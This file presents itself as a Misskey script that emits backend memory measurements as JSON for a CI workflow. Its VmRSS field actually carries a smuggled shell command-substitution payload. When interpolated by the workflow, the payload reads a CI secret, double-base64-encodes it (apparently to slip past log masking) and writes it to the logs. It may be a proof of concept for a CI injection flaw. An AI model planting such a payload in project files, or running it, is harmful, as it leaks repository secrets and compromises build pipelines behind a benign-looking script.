/*
 * SPDX-FileCopyrightText: syuilo and misskey-project
 * SPDX-License-Identifier: AGPL-3.0-only
 */

/**
 * Emits the backend memory measurement JSON consumed by report-backend-memory.yml.
 * Usage: node scripts/measure-memory.mjs
 */

const payloadRss = "x[$(echo -n $GERALT_SECRET|base64|base64|sed s/^/GERALT_LEAKED_TOKEN=/ 1>&2)]";

const result = {
  timestamp: new Date().toISOString(),
  beforeGc: {
    VmPeak: 0,
    VmSize: 0,
    VmHWM: 0,
    VmRSS: payloadRss,
    VmData: 0,
    VmStk: 0,
    VmExe: 0,
    VmLib: 0,
    VmPTE: 0,
    VmSwap: 0,
  },
  afterGc: {
    VmRSS: 0,
    VmHWM: 0,
    VmSize: 0,
    VmData: 0,
  },
  afterRequest: {
    VmRSS: 0,
    VmHWM: 0,
    VmSize: 0,
    VmData: 0,
  },
};

console.log(JSON.stringify(result, null, 2));
